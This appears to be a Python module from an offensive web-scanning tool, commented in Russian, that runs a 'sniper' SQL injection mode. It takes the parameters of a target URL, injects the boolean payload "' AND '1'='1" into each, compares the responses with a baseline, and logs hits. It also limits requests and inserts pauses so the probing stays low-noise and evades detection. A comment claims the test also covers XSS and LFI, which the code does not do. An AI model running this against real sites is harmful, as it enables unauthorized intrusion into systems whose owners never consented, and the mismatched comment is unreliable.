"""sniper_mode — precise, low-noise attack mode (minimal requests, high accuracy)"""
from core.http import HttpClient
from core.probe import Probe
import time


class SniperMode:
    """
    Sniper mode: минимальное количество запросов, максимальная точность.
    - Baseline (1 запрос)
    - Целевой payload (1 запрос)
    - Verify (1 запрос)
    - Пауза 5-15 секунд между атаками
    - Ограничение 5-20 запросов на цель
    """
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        print("[sniper] проверка цели одним запросом")
        base = http.get(target)
        if not base:
            print("  ✗ нет ответа")
            return {}
        print(f"  baseline: {base.status_code} {len(base.content)}b")
        time.sleep(5)

        # точная проверка на конкретный вектор (определяется из URL)
        from urllib.parse import urlparse, parse_qs
        u = urlparse(target)
        params = parse_qs(u.query)

        if not params:
            print("[sniper] нет параметров — нечего атаковать точно")
            print("  используй: sniper по URL с параметром (?id=1)")
            return {"params": []}

        print(f"[sniper] параметры: {list(params.keys())}")

        # одна проверка на параметр — самый эффективный payload
        probe = Probe(session, logger)
        probe.baseline = {"code": base.status_code, "len": len(base.content),
                          "text": base.text, "time": 0}

        findings = []
        for name, vals in params.items():
            # универсальный тест: ' (SQLi) + <script> (XSS) + ../ (LFI)
            test = vals[0] + "' AND '1'='1"
            url_fn = lambda pl, u=u, params=params, name=name: u._replace(
                query=f"{name}={pl}").geturl()

            r = probe.inject(url_fn, test)
            time.sleep(3)
            if r["hit"]:
                print(f"  ✓ [{name}] {r['reason']}")
                findings.append({"param": name, "payload": test,
                                 "reason": r["reason"]})
                logger.finding("sniper", "high", f"{name} {r['reason']}")
            else:
                print(f"  · [{name}] нет попадания")
                time.sleep(3)

        print(f"[sniper] findings: {len(findings)}")
        print(f"[sniper] requests: {probe.stats['requests']}")
        return {"findings": findings, "stats": probe.summary()}
